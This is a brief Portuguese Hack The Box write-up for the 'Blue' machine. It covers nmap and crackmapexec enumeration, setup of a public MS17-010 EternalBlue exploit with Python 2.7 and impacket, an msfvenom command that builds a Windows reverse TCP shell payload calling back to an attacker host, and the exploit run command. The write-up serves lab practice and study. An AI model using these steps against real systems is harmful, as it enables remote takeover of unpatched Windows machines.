# HTB - WRITE UP - BLUE
## POC: https://www.redteamzone.seg.br/2022/10/blue-htb-writeup-eternal-blue-exploit.html

# Enumeração 
## NMAP Geral
```
nmap -Pn -sV -O -sC [ip]
nmap -Pn -sV -sC -sU [ip]
```

## NMAP específico para cada serviço 

## SMB
```
nmap -Pn --script vuln -p 445 [ip]
```

## Crackmapexec
```
crackmapexec smb [ip] -u "" -p "" --shares 
```

## MS17-010
## Exploit
https://github.com/worawit/MS17-010

## Requisitos para explorar o Eternal Blue
[+] O exploit usa a versão python2.7<p>
[+] é necessário criar um ambiente virtual do python na versão 2.7<p>
[+] O pip2.7 precisa ser instalado e para fazer isso é necessário seguir as etapas abaixo:<p>
  + Download do script para obter o pip2.7<p>
  ```  
  wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
  ```  
  + Instalação do pip2.7  
  ```  
  python2.7 get-pip.py
  ```  
[+] O exploit usa o módulo impacket<p> 
[+] É necessário instalar o impacket no ambiente virtual do python2.7<p>
  + Error na instalação do impacket para o python2.7<p>
    
    + Instale o setuptools com o pip2.7<p>
    ```
    pip2.7 install --upgrade setuptools
    ```
      
    + Instale o impacket com o pip2.7<p>
    ```
    pip2.7 install impacket
    ```
    
## Shellcode
```
msfvenom -p windows/x64/shell_reverse_tcp -f raw -a x64 -o scx64_msf.bin EXITFUNC=thread LHOST=[IP] LPORT=2525
```
      
## Execução do Exploit
```
python2.7 eternalblue_exploit7.py [IP] final_sc_x64.bin
```
      
      
